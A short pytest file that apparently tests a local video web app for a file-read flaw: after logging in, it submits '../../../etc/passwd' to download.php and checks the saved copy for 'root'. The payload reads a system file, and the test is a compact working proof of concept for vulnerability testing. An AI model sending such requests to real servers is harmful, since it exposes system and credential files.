import pytest
import requests

def test_ssrf():
	url = "http://localhost/"
	with requests.Session() as s:
		# login
		s.post(url+"login.php", data={'username':'test','password':'test'})
		home = s.get("http://localhost/")
		assert("What do you want to watch today" in home.text)
		# upload
		s.post(url+"download.php", data={'urlToUpload':'../../../etc/passwd','nameOfFile':'SSRF_TEST'})
		# access
		exploit = s.get("http://localhost/videos/SSRF_TEST")
		assert(exploit.text.find("root") != -1)	
